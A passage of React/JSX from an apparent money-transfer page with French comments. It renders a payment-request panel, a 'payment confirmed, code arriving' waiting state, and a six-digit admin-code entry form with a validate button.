                  <p className="text-gray-500 text-[11px] mt-0.5">{t("transfert.payment_request_sub")}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-5 space-y-4">
              {montantStr && (
                <div className="bg-amber-50 border-2 border-[#FFD500]/40 rounded-xl px-5 py-4 text-center">
                  <p className="text-[10px] text-amber-600 uppercase tracking-widest font-bold mb-1">{t("transfert.amount_to_pay")}</p>
                  <p className="text-3xl font-extrabold text-[#FFD500]">{montantStr}</p>
                </div>
              )}
              <div className="flex items-start gap-3 bg-blue-50 border border-blue-100 rounded-xl px-4 py-3">
                <MessageSquare className="w-4 h-4 text-blue-500 shrink-0 mt-0.5" />
                <p className="text-xs text-blue-700 leading-relaxed">{t("transfert.payment_instructions")}</p>
              </div>
              <div className="flex items-start gap-2 bg-amber-50 border border-amber-100 rounded-xl px-4 py-3">
                <Info className="w-4 h-4 text-amber-500 shrink-0 mt-0.5" />
                <p className="text-xs text-amber-700 leading-relaxed">{t("transfert.payment_auto_update")}</p>
              </div>
            </div>
          </div>
        )}

        {/* ── État C : Paiement confirmé — code en préparation ────────────── */}
        {!successData && etape >= 2 && paiementConfirmeAt && !codeAdminSent && (
          <div className="bg-white border border-green-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 py-5 border-b border-green-100 bg-green-50/50">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-green-600 flex items-center justify-center shrink-0">
                  <CheckCircle className="w-4 h-4 text-white" />
                </div>
                <div>
                  <h2 className="font-extrabold text-[#0D1F3C] text-sm">{t("transfert.payment_confirmed_title")}</h2>
                  <p className="text-gray-500 text-[11px] mt-0.5">{t("transfert.payment_confirmed_sub")}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-8 text-center">
              <div className="w-16 h-16 rounded-full bg-green-50 border-2 border-green-200 flex items-center justify-center mx-auto mb-4">
                <Loader2 className="w-8 h-8 text-green-400 animate-spin" />
              </div>
              <p className="text-sm font-semibold text-[#0D1F3C] mb-1">{t("transfert.code_arriving")}</p>
              <p className="text-xs text-gray-400 leading-relaxed">{t("transfert.code_arriving_desc")}</p>
            </div>
          </div>
        )}

        {/* ── État D : Code reçu — saisie du code ────────────────────────── */}
        {!successData && etape >= 2 && codeAdminSent && (
          <div className="bg-white border border-[#FFD500]/30 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 py-5 border-b border-[#FFD500]/20 bg-amber-50/40">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-[#FFD500] flex items-center justify-center shrink-0">
                  <Shield className="w-4 h-4 text-white" />
                </div>
                <div>
                  <h2 className="font-extrabold text-[#0D1F3C] text-sm">{t(LIBELLE_KEYS[etape])}</h2>
                  <p className="text-gray-500 text-[11px] mt-0.5">{t("transfert.enter_code_sub")}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-5 space-y-4">
              <OtpInput
                value={adminCode}
                onChange={setAdminCode}
                onComplete={validerAdmin}
                disabled={submittingAdmin}
              />
              <button
                onClick={validerAdmin}
                disabled={adminCode.length < 6 || submittingAdmin}
                className="w-full py-3.5 rounded-xl font-extrabold text-sm text-white transition-all disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                style={{ background: "linear-gradient(135deg, #FFD500 0%, #FFD500 100%)", boxShadow: adminCode.length === 6 && !submittingAdmin ? "0 4px 20px rgba(181,135,42,0.35)" : "none" }}
              >
                {submittingAdmin
                  ? <><Loader2 className="w-4 h-4 animate-spin" /> {t("transfert.validate_loading")}</>
                  : <><CheckCircle className="w-4 h-4" /> {t("transfert.validate_code")}</>}
              </button>
            </div>
            <div className="px-6 pb-5">
              <div className="flex items-start gap-2 bg-blue-50 border border-blue-100 rounded-xl px-4 py-3">
                <Info className="w-4 h-4 text-blue-500 shrink-0 mt-0.5" />
                <p className="text-xs text-blue-700 leading-relaxed">{t("transfert.code_transmitted")}</p>
              </div>
            </div>
          </div>
        )}

      </div>
    </UserLayout>
  );
}
